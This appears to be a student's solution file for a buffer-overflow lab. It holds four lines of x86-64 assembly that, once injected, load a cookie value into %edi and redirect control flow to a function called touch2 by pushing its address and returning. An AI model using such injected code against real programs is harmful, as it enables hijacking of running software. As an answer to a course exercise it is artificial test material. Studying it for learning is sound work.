# Assembly code needed to change register values as well as return addresses
xor 	%edi, %edi			# set edi to 0
add 	$0x5788e9e7, %edi	# insert cookie value into edi
pushq 	$0x40198c			# push add. of touch2 to stack for return
retq 						# return to the address just pushed (touch2)
